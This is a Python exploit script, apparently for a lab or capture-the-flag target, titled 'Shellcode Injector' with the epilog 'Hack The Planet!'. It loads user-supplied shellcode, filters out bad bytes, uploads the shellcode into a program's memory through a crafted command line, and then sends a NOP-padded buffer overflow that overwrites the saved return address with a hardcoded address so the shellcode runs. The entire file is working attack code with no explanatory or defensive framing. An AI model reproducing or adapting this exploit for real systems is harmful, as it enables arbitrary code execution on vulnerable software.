import argparse
import sys
bprint = sys.stdout.buffer.write


# Calculating payload start offset
mem_start = 0x804c0c0
payload_padding = 0 # no padding is needed
payload_start = mem_start + 16 + 5 + payload_padding

# Calculating trigger offset
path_max_length = 81
buffer_to_eip_diff = 1


def load_shellcode(shellcode_path): # type: (str) -> bytes
    bad_bytes = (b'\x00', b'\x20', b'\x0a', b'\x0b', b'\x0d', b'\x2c')

    try:
        with open(shellcode_path, mode='rb') as file:
            data = file.read()
            for bad in bad_bytes:
                if bad in data:
                    raise ValueError('contains banned character code: %s' % (bad.__str__()[4:6],))
            return data
    except Exception as e:
        raise argparse.ArgumentTypeError("can't open '%s': %s" % (shellcode_path, e))


def payload__upload_shellcode(shellcode): # type: (bytes) -> bytes
    # <action> <type> <name> <path> <reason>
    return b'1 0 ' + (b'\x90' * payload_padding) + shellcode + b' \0 \0\n'

def payload__overflow_and_trigger_shellcode(): # type: () -> bytes
    address_padding = path_max_length + buffer_to_eip_diff
    payload_address = payload_start.to_bytes(4, 'little')

    # <action> <type> <name> <path> <reason>
    return b'1 0 \0 ' + (b'\x90' * address_padding) + payload_address + b' \0\n'


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        prog='Shellcode Injector',
        description='Injects shellcode into a pipe',
        epilog='Hack The Planet!'
    )

    parser.add_argument('shellcode', help='Path to shellcode binary file', type=load_shellcode)
    parser.add_argument('-c', '--check-only', action='store_true', help='Only checks provided shellcode for forbidden values, no hacking this time')
    args = parser.parse_args()

    if args.check_only:
        exit(0)

    bprint(payload__upload_shellcode(args.shellcode))
    bprint(b'0\n') # preview uploaded shellcode
    bprint(payload__overflow_and_trigger_shellcode())

